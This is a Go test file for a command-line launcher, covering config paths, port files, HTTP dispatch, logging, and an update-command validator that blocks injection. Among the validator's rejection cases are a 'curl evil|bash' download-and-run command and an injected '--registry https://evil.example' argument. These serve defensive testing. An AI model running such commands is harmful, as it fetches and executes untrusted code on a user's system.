package launcher

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// --- DefaultConfigDir ---

func TestDefaultConfigDir_usesXDGStandard(t *testing.T) {
	// No dot prefix; uses ~/.config/<appName> by default.
	t.Setenv("XDG_CONFIG_HOME", "")
	result := DefaultConfigDir("myapp")
	if result == "" {
		t.Error("expected non-empty path")
	}
	// Must NOT have a dot prefix on the app name.
	if strings.Contains(result, "/.myapp") || strings.HasSuffix(result, "\\.myapp") {
		t.Errorf("expected XDG path without dot prefix, got %s", result)
	}
	if !strings.Contains(result, filepath.Join(".config", "myapp")) {
		t.Errorf("expected path to contain .config/myapp, got %s", result)
	}
}

func TestDefaultConfigDir_respectsXDGConfigHome(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", "/custom/xdg")
	result := DefaultConfigDir("myapp")
	expected := filepath.Join("/custom/xdg", "myapp")
	if result != expected {
		t.Errorf("expected %s, got %s", expected, result)
	}
}

// --- extractConfigArg ---

func TestExtractConfigArg_present(t *testing.T) {
	dir, remaining := extractConfigArg([]string{"--config", "/my/dir", "--quit"})
	if dir != "/my/dir" {
		t.Errorf("expected /my/dir, got %s", dir)
	}
	if len(remaining) != 1 || remaining[0] != "--quit" {
		t.Errorf("expected [--quit], got %v", remaining)
	}
}

func TestExtractConfigArg_absent(t *testing.T) {
	dir, remaining := extractConfigArg([]string{"--quit", "--sync-now"})
	if dir != "" {
		t.Errorf("expected empty dir, got %s", dir)
	}
	if len(remaining) != 2 {
		t.Errorf("expected original args unchanged, got %v", remaining)
	}
}

func TestExtractConfigArg_configAtEnd_noValue(t *testing.T) {
	// --config with no following value: treated as absent (no dir extracted).
	dir, remaining := extractConfigArg([]string{"--config"})
	if dir != "" {
		t.Errorf("expected empty dir when --config has no value, got %s", dir)
	}
	if len(remaining) != 1 || remaining[0] != "--config" {
		t.Errorf("expected [--config] in remaining, got %v", remaining)
	}
}

// --- ResolveConfigDir ---

func TestResolveConfigDir_configFlagTakesPriority(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", "/should/be/ignored")
	dir, remaining := ResolveConfigDir("myapp", []string{"--config", "/explicit/dir", "--quit"})
	if dir != "/explicit/dir" {
		t.Errorf("expected /explicit/dir, got %s", dir)
	}
	if len(remaining) != 1 || remaining[0] != "--quit" {
		t.Errorf("expected [--quit] in remaining, got %v", remaining)
	}
}

func TestResolveConfigDir_xdgFallback(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", "/xdg/base")
	dir, _ := ResolveConfigDir("myapp", []string{})
	if dir != filepath.Join("/xdg/base", "myapp") {
		t.Errorf("expected /xdg/base/myapp, got %s", dir)
	}
}

func TestResolveConfigDir_homeFallback(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", "")
	dir, _ := ResolveConfigDir("myapp", []string{})
	if !strings.Contains(dir, filepath.Join(".config", "myapp")) {
		t.Errorf("expected ~/.config/myapp, got %s", dir)
	}
}

// --- migrateConfigDir ---

func TestMigrateConfigDir_renamesLegacyPath(t *testing.T) {
	base := t.TempDir()
	oldPath := filepath.Join(base, ".myapp")
	newPath := filepath.Join(base, ".config", "myapp")

	// Create a file in the legacy dir to verify rename.
	if err := os.MkdirAll(oldPath, 0o755); err != nil {
		t.Fatal(err)
	}
	os.WriteFile(filepath.Join(oldPath, "config.port"), []byte("{}"), 0o600)

	migrateConfigDir(oldPath, newPath)

	if _, err := os.Stat(oldPath); !os.IsNotExist(err) {
		t.Error("legacy path should no longer exist after migration")
	}
	if _, err := os.Stat(filepath.Join(newPath, "config.port")); err != nil {
		t.Errorf("new path should contain migrated files: %v", err)
	}
}

func TestMigrateConfigDir_skipsWhenOldAbsent(t *testing.T) {
	base := t.TempDir()
	// old path does not exist — should be a no-op
	migrateConfigDir(filepath.Join(base, "absent"), filepath.Join(base, "new"))
	if _, err := os.Stat(filepath.Join(base, "new")); !os.IsNotExist(err) {
		t.Error("new path should not be created when old path is absent")
	}
}

func TestMigrateConfigDir_skipsWhenNewAlreadyExists(t *testing.T) {
	base := t.TempDir()
	oldPath := filepath.Join(base, "old")
	newPath := filepath.Join(base, "new")
	os.MkdirAll(oldPath, 0o755)
	os.MkdirAll(newPath, 0o755)
	os.WriteFile(filepath.Join(newPath, "sentinel"), []byte("existing"), 0o600)

	migrateConfigDir(oldPath, newPath)

	// old path must still exist (nothing renamed)
	if _, err := os.Stat(oldPath); err != nil {
		t.Error("old path should still exist when new path already exists")
	}
}

// --- isCLIDispatch ---

func TestIsCLIDispatch_match(t *testing.T) {
	if !isCLIDispatch([]string{"--quit"}, []string{"--quit", "--sync-now"}) {
		t.Error("expected true for --quit")
	}
}

func TestIsCLIDispatch_noMatch(t *testing.T) {
	if isCLIDispatch([]string{"~/.myapp"}, []string{"--quit", "--sync-now"}) {
		t.Error("expected false for config dir arg")
	}
}

func TestIsCLIDispatch_empty(t *testing.T) {
	if isCLIDispatch([]string{}, []string{"--quit"}) {
		t.Error("expected false for empty args")
	}
}

// --- readPortFile / readHealthToken ---

func TestReadPortFile_valid(t *testing.T) {
	dir := t.TempDir()
	data := portFile{Port: 47823, Pid: 1234}
	b, _ := json.Marshal(data)
	os.WriteFile(filepath.Join(dir, "config.port"), b, 0o600)

	pf, err := readPortFile(dir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if pf.Port != 47823 {
		t.Errorf("expected port 47823, got %d", pf.Port)
	}
	if pf.Pid != 1234 {
		t.Errorf("expected pid 1234, got %d", pf.Pid)
	}
}

func TestReadPortFile_missing(t *testing.T) {
	_, err := readPortFile(t.TempDir())
	if err == nil {
		t.Error("expected error for missing config.port")
	}
}

func TestReadPortFile_malformed(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "config.port"), []byte("not json"), 0o600)
	_, err := readPortFile(dir)
	if err == nil {
		t.Error("expected error for malformed JSON")
	}
}

func TestReadPortFile_portZero(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "config.port"), []byte(`{"port":0,"pid":1}`), 0o600)
	_, err := readPortFile(dir)
	if err == nil {
		t.Error("expected error for port=0")
	}
}

func TestReadHealthToken_valid(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "health_token"), []byte("abc123\n"), 0o600)

	tok, err := readHealthToken(dir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if tok != "abc123" {
		t.Errorf("expected trimmed token 'abc123', got %q", tok)
	}
}

func TestReadHealthToken_missing(t *testing.T) {
	_, err := readHealthToken(t.TempDir())
	if err == nil {
		t.Error("expected error for missing health_token")
	}
}

// --- HTTP dispatch (mock server) ---

func TestHTTPDispatch_success(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Authorization") != "Bearer testtoken" {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"ok":true}`))
	}))
	defer srv.Close()

	// Verify the HTTP client honours the 10s timeout (just test the call succeeds)
	client := &http.Client{Timeout: 10 * 1e9}
	req, _ := http.NewRequest(http.MethodPost, srv.URL+"/quit", nil)
	req.Header.Set("Authorization", "Bearer testtoken")
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Errorf("expected 200, got %d", resp.StatusCode)
	}
}

func TestHTTPDispatch_unauthorized(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusUnauthorized)
	}))
	defer srv.Close()

	client := &http.Client{Timeout: 10 * 1e9}
	req, _ := http.NewRequest(http.MethodPost, srv.URL+"/quit", nil)
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusUnauthorized {
		t.Errorf("expected 401, got %d", resp.StatusCode)
	}
}

// --- formatDaemonNotRunning ---

func TestFormatDaemonNotRunning(t *testing.T) {
	msg := formatDaemonNotRunning("myapp", "/home/user/.myapp")
	if !strings.Contains(msg, "myapp daemon is not running") {
		t.Errorf("expected app name in %q", msg)
	}
	if !strings.Contains(msg, filepath.Join("/home/user/.myapp", "logs")) {
		t.Errorf("expected log dir in %q", msg)
	}
	if !strings.Contains(msg, "Start it with: myapp") {
		t.Errorf("expected start hint in %q", msg)
	}
}

// --- formatDaemonNotResponding ---

func TestFormatDaemonNotResponding(t *testing.T) {
	msg := formatDaemonNotResponding("myapp", 47823, "/home/user/.myapp")
	if !strings.Contains(msg, "47823") {
		t.Errorf("expected port in %q", msg)
	}
	if !strings.Contains(msg, filepath.Join("/home/user/.myapp", "logs")) {
		t.Errorf("expected log dir in %q", msg)
	}
	if !strings.Contains(msg, "To restart: myapp") {
		t.Errorf("expected restart hint in %q", msg)
	}
}

// --- formatHTTPError ---

func TestFormatHTTPError_401(t *testing.T) {
	msg := formatHTTPError("myapp", 401, "quit", "/home/.myapp")
	if !strings.Contains(msg, "Authentication error") {
		t.Errorf("expected auth error in %q", msg)
	}
}

func TestFormatHTTPError_404(t *testing.T) {
	msg := formatHTTPError("myapp", 404, "unknown-cmd", "/home/.myapp")
	if !strings.Contains(msg, "unknown-cmd") {
		t.Errorf("expected command name in %q", msg)
	}
	if !strings.Contains(msg, "myapp --help") {
		t.Errorf("expected help hint in %q", msg)
	}
}

func TestFormatHTTPError_500(t *testing.T) {
	msg := formatHTTPError("myapp", 500, "quit", "/home/.myapp")
	if !strings.Contains(msg, "internal error") {
		t.Errorf("expected internal error in %q", msg)
	}
	if !strings.Contains(msg, filepath.Join("/home/.myapp", "logs")) {
		t.Errorf("expected log dir in %q", msg)
	}
}

func TestFormatHTTPError_other(t *testing.T) {
	msg := formatHTTPError("myapp", 503, "quit", "/home/.myapp")
	if !strings.Contains(msg, "503") {
		t.Errorf("expected status code in %q", msg)
	}
	if !strings.Contains(msg, filepath.Join("/home/.myapp", "logs")) {
		t.Errorf("expected log dir in %q", msg)
	}
}

// --- formatNodeStartError ---

func TestFormatNodeStartError(t *testing.T) {
	err := fmt.Errorf("exec: not found")
	msg := formatNodeStartError("/path/to/app.cjs", err)
	if !strings.Contains(msg, "app.cjs") {
		t.Errorf("expected script name in %q", msg)
	}
	if !strings.Contains(msg, "exec: not found") {
		t.Errorf("expected error in %q", msg)
	}
	if !strings.Contains(msg, "node is in PATH") {
		t.Errorf("expected PATH hint in %q", msg)
	}
}

// --- formatSentinelReadError ---

func TestFormatSentinelReadError_notExist(t *testing.T) {
	msg := formatSentinelReadError("/config/config.restart", os.ErrNotExist)
	if !strings.Contains(msg, "Exiting cleanly") {
		t.Errorf("expected clean exit message in %q", msg)
	}
}

func TestFormatSentinelReadError_other(t *testing.T) {
	err := fmt.Errorf("permission denied")
	msg := formatSentinelReadError("/config/config.restart", err)
	if !strings.Contains(msg, "permission denied") {
		t.Errorf("expected error in %q", msg)
	}
	if !strings.Contains(msg, "/config/config.restart") {
		t.Errorf("expected path in %q", msg)
	}
}

// --- writeLauncherPIDFile ---

func TestWriteLauncherPIDFile(t *testing.T) {
	dir := t.TempDir()
	if err := writeLauncherPIDFile(dir, 12345); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	data, err := os.ReadFile(filepath.Join(dir, "config.launcher-pid"))
	if err != nil {
		t.Fatalf("could not read PID file: %v", err)
	}
	if string(data) != "12345" {
		t.Errorf("expected '12345', got %q", string(data))
	}
}

// --- hasConsole + stdio assignment ---

// --- openNulStdio ---
// These tests guard against regressions where someone changes openNulStdio to
// return nil. nil stdio in runDaemon leaves STARTF_USESTDHANDLES unset, causing
// node to inherit the launcher's invalid DETACHED_PROCESS handles → libuv crash
// before any JS runs → no restart after auto-update.

func TestOpenNulStdio_returnsNonNilHandles(t *testing.T) {
	stdin, stdout, stderr := openNulStdio()
	if stdin == nil {
		t.Error("stdin must not be nil — nil leaves STARTF_USESTDHANDLES unset, node inherits invalid handles")
	}
	if stdout == nil {
		t.Error("stdout must not be nil — nil leaves STARTF_USESTDHANDLES unset, node inherits invalid handles")
	}
	if stderr == nil {
		t.Error("stderr must not be nil — nil leaves STARTF_USESTDHANDLES unset, node inherits invalid handles")
	}
}

func TestOpenNulStdio_handlesAreWritable(t *testing.T) {
	_, stdout, _ := openNulStdio()
	if stdout == nil {
		t.Fatal("openNulStdio returned nil stdout")
	}
	defer stdout.Close()
	_, err := fmt.Fprint(stdout, "test")
	if err != nil {
		t.Errorf("write to NUL stdout failed: %v", err)
	}
}

func TestRunDaemon_headlessUsesDevNullNotNil(t *testing.T) {
	// Regression test: when hasConsole() is false, the cmd passed to node
	// must have non-nil Stdout/Stderr. This is verified by calling openNulStdio
	// (the function used in runDaemon) and checking the result.
	if hasConsole() {
		// In console mode, openNulStdio is not called; test the console path instead.
		// os.Stdout/os.Stderr are used directly — they are always non-nil.
		if os.Stdout == nil {
			t.Error("os.Stdout should not be nil in console mode")
		}
		return
	}
	stdin, stdout, stderr := openNulStdio()
	if stdin == nil || stdout == nil || stderr == nil {
		t.Errorf("openNulStdio returned nil in headless mode: stdin=%v stdout=%v stderr=%v", stdin, stdout, stderr)
	}
}

// --- validateUpdateCmd ---

func TestValidateUpdateCmd_nil(t *testing.T) {
	if err := validateUpdateCmd(nil); err != nil {
		t.Errorf("expected nil for empty cmd, got %v", err)
	}
}

func TestValidateUpdateCmd_empty(t *testing.T) {
	if err := validateUpdateCmd([]string{}); err != nil {
		t.Errorf("expected nil for empty slice, got %v", err)
	}
}

func TestValidateUpdateCmd_valid(t *testing.T) {
	cases := [][]string{
		{"npm", "install", "-g", "@wadeck/wdrive"},
		{"npm", "install", "-g", "@wadeck/wdrive@1.2.3"},
		{"npm", "install", "-g", "@wadeck/flow-cli"},
		{"npm", "install", "-g", "@wadeck/some-pkg@0.0.1-alpha.1"},
	}
	for _, cmd := range cases {
		if err := validateUpdateCmd(cmd); err != nil {
			t.Errorf("expected valid for %v, got %v", cmd, err)
		}
	}
}

func TestValidateUpdateCmd_tooFewArgs(t *testing.T) {
	if err := validateUpdateCmd([]string{"npm", "install", "-g"}); err == nil {
		t.Error("expected error for < 4 args")
	}
}

func TestValidateUpdateCmd_tooManyArgs(t *testing.T) {
	// Extra args could be injection; reject strictly.
	if err := validateUpdateCmd([]string{"npm", "install", "-g", "@wadeck/wdrive", "--registry", "https://evil.example"}); err == nil {
		t.Error("expected error for > 4 args")
	}
}

func TestValidateUpdateCmd_wrongBinary(t *testing.T) {
	if err := validateUpdateCmd([]string{"sh", "-c", "curl evil|bash", "@wadeck/wdrive"}); err == nil {
		t.Error("expected error when cmd[0] is not npm")
	}
}

func TestValidateUpdateCmd_wrongSubcommand(t *testing.T) {
	if err := validateUpdateCmd([]string{"npm", "run", "-g", "@wadeck/wdrive"}); err == nil {
		t.Error("expected error when cmd[1] is not install")
	}
}

func TestValidateUpdateCmd_noGFlag(t *testing.T) {
	if err := validateUpdateCmd([]string{"npm", "install", "--save", "@wadeck/wdrive"}); err == nil {
		t.Error("expected error when cmd[2] is not -g")
	}
}

func TestValidateUpdateCmd_wrongScope(t *testing.T) {
	cases := [][]string{
		{"npm", "install", "-g", "@other/pkg"},
		{"npm", "install", "-g", "wdrive"},
		{"npm", "install", "-g", "@wadeck"},
	}
	for _, cmd := range cases {
		if err := validateUpdateCmd(cmd); err == nil {
			t.Errorf("expected error for wrong scope in %v", cmd)
		}
	}
}

// --- Config.UpdateCmd field ---

func TestConfig_updateCmdField(t *testing.T) {
	// Verify the field is accessible and usable on the Config struct.
	cfg := Config{
		UpdateCmd: []string{"npm", "install", "-g", "@wadeck/wdrive"},
	}
	if len(cfg.UpdateCmd) != 4 {
		t.Errorf("expected UpdateCmd length 4, got %d", len(cfg.UpdateCmd))
	}
	if err := validateUpdateCmd(cfg.UpdateCmd); err != nil {
		t.Errorf("expected valid UpdateCmd, got %v", err)
	}
}

// --- unused exec import guard ---
var _ = exec.Command

// --- logger: headless / fallback ---

func TestOpenLogFile_succeedsWithValidDir(t *testing.T) {
	dir := t.TempDir()
	logMu.Lock()
	if logFile != nil { logFile.Close() }
	logFile = nil
	logDay = ""
	logMu.Unlock()

	if err := openLogFile(dir); err != nil {
		t.Fatalf("openLogFile with valid dir failed: %v", err)
	}
	logMu.Lock()
	ok := logFile != nil
	if logFile != nil { logFile.Close() }
	logFile = nil
	logDay = ""
	logMu.Unlock()
	if !ok {
		t.Fatal("logFile should not be nil after successful openLogFile")
	}
}

func TestLogWrite_writesToFileEvenWhenStderrIsDevNull(t *testing.T) {
	devNull, err := os.Open(os.DevNull)
	if err != nil {
		t.Skipf("cannot open devnull: %v", err)
	}
	origStderr := os.Stderr
	os.Stderr = devNull
	defer func() {
		os.Stderr = origStderr
		devNull.Close()
	}()

	dir := t.TempDir()
	logMu.Lock()
	if logFile != nil { logFile.Close() }
	logFile = nil
	logDay = ""
	logMu.Unlock()

	logInfo(dir, "test", "headless log test")

	// Close logFile before TempDir cleanup to avoid "file in use" error on Windows
	logMu.Lock()
	if logFile != nil { logFile.Close() }
	logFile = nil
	logDay = ""
	logMu.Unlock()

	pattern := filepath.Join(dir, "logs", "*.log")
	matches, _ := filepath.Glob(pattern)
	if len(matches) == 0 {
		t.Fatal("expected log file to be created, got none — logWrite silently dropped the entry when stderr=devnull")
	}
	content, _ := os.ReadFile(matches[0])
	if !strings.Contains(string(content), "headless log test") {
		t.Fatalf("expected log message in file, got: %q", string(content))
	}
}

func TestLogWrite_fallsBackToTempWhenConfigDirEmpty(t *testing.T) {
	// Compute fallback path using same logic as writeFallbackLog
	exe := filepath.Base(os.Args[0])
	fallback := filepath.Join(os.TempDir(), exe+"-launcher-fallback.log")
	// Remove any existing fallback log so we can detect a fresh write
	_ = os.Remove(fallback)

	logWrite("", " INFO", "test", "hello from empty configDir")

	// After fix: fallback file must exist with the message
	content, err := os.ReadFile(fallback)
	if err != nil {
		t.Fatalf("fallback log not created: %v — logWrite with empty configDir must write to temp fallback", err)
	}
	if !strings.Contains(string(content), "hello from empty configDir") {
		t.Fatalf("expected message in fallback log, got: %q", string(content))
	}
}

func TestHasConsole_doesNotPanic(t *testing.T) {
	defer func() {
		if r := recover(); r != nil {
			t.Errorf("hasConsole() panicked: %v", r)
		}
	}()
	_ = hasConsole()
}

// --- checkSentinels ---

// closeTestLogFile releases the global log file handle so t.TempDir() can clean up
// on Windows (which rejects RemoveAll when the log file is still open).
func closeTestLogFile() {
	logMu.Lock()
	defer logMu.Unlock()
	if logFile != nil {
		logFile.Close()
		logFile = nil
		logDay = ""
	}
}

func TestCheckSentinels_noSentinels(t *testing.T) {
	dir := t.TempDir()
	// closeTestLogFile must be registered AFTER t.TempDir() so LIFO order runs
	// the log-file close before the directory removal (Windows file-lock fix).
	t.Cleanup(closeTestLogFile)
	cfg := Config{ConfigDir: dir}
	result := checkSentinels(dir, cfg)
	if result.action != sentinelNone {
		t.Errorf("expected sentinelNone, got %d (%s)", result.action, result.reason)
	}
}

func TestCheckSentinels_updateSentinelNoCmd(t *testing.T) {
	dir := t.TempDir()
	t.Cleanup(closeTestLogFile)
	os.WriteFile(filepath.Join(dir, "config.update"), []byte("{}"), 0o600)
	cfg := Config{ConfigDir: dir}
	result := checkSentinels(dir, cfg)
	if result.action != sentinelNone {
		t.Errorf("expected sentinelNone when UpdateCmd is empty, got %d (%s)", result.action, result.reason)
	}
	// Sentinel file must have been removed (it was consumed even though action is None).
	if _, err := os.Stat(filepath.Join(dir, "config.update")); !os.IsNotExist(err) {
		t.Error("config.update should have been removed after being read")
	}
}

func TestCheckSentinels_updateSentinelWithValidCmd(t *testing.T) {
	dir := t.TempDir()
	t.Cleanup(closeTestLogFile)
	os.WriteFile(filepath.Join(dir, "config.update"), []byte("{}"), 0o600)
	cfg := Config{
		ConfigDir: dir,
		UpdateCmd: []string{"npm", "install", "-g", "@wadeck/wdrive"},
	}
	result := checkSentinels(dir, cfg)
	if result.action != sentinelUpdate {
		t.Errorf("expected sentinelUpdate, got %d (%s)", result.action, result.reason)
	}
	// Sentinel file must have been removed.
	if _, err := os.Stat(filepath.Join(dir, "config.update")); !os.IsNotExist(err) {
		t.Error("config.update should have been removed")
	}
}

func TestCheckSentinels_updateSentinelWithInvalidCmd(t *testing.T) {
	dir := t.TempDir()
	t.Cleanup(closeTestLogFile)
	os.WriteFile(filepath.Join(dir, "config.update"), []byte("{}"), 0o600)
	cfg := Config{
		ConfigDir: dir,
		// Invalid: only 3 args, wrong binary — validateUpdateCmd will reject this.
		UpdateCmd: []string{"sh", "-c", "evil"},
	}
	result := checkSentinels(dir, cfg)
	if result.action != sentinelNone {
		t.Errorf("expected sentinelNone for invalid UpdateCmd, got %d (%s)", result.action, result.reason)
	}
}

func TestCheckSentinels_restartSentinel(t *testing.T) {
	dir := t.TempDir()
	t.Cleanup(closeTestLogFile)
	os.WriteFile(filepath.Join(dir, "config.restart"), []byte(""), 0o600)
	cfg := Config{ConfigDir: dir}
	result := checkSentinels(dir, cfg)
	if result.action != sentinelRestart {
		t.Errorf("expected sentinelRestart, got %d (%s)", result.action, result.reason)
	}
	// Sentinel file must have been removed.
	if _, err := os.Stat(filepath.Join(dir, "config.restart")); !os.IsNotExist(err) {
		t.Error("config.restart should have been removed after restart is triggered")
	}
}

func TestCheckSentinels_restartPreservedWhenUpdateCmdNotSet(t *testing.T) {
	// Critical regression: config.update present but UpdateCmd is empty.
	// The update sentinel must be consumed (removed) and execution must fall through
	// to the restart check so config.restart is honoured — the wdrive pre-T9 flow.
	dir := t.TempDir()
	t.Cleanup(closeTestLogFile)
	os.WriteFile(filepath.Join(dir, "config.update"), []byte("{}"), 0o600)
	os.WriteFile(filepath.Join(dir, "config.restart"), []byte(""), 0o600)
	cfg := Config{ConfigDir: dir} // UpdateCmd intentionally absent
	result := checkSentinels(dir, cfg)
	if result.action != sentinelRestart {
		t.Errorf("expected sentinelRestart when UpdateCmd is unset and config.restart is present, got %d (%s)", result.action, result.reason)
	}
}
